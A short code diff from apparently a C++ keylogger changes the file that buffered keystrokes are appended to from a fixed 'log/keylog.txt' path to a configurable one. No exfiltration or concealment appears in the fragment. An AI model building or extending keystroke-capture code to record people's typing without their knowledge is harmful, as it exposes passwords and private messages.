@@ -12,7 +12,7 @@ void KeyLogger::onKeyPress(std::string str) {
 void KeyLogger::flushBufferToFile(){
     debug_log(LogLevel::Info, "flush: ", keyBuffer);
     std::ofstream file;
-    file.open("log/keylog.txt", std::ios::app);  // 追記モード
+    file.open(logfilepath, std::ios::app);  // 追記モード
     debug_log(LogLevel::Info, "open!");
     if (!file.is_open()) {
         debug_log(LogLevel::Info, "couldnt open file");
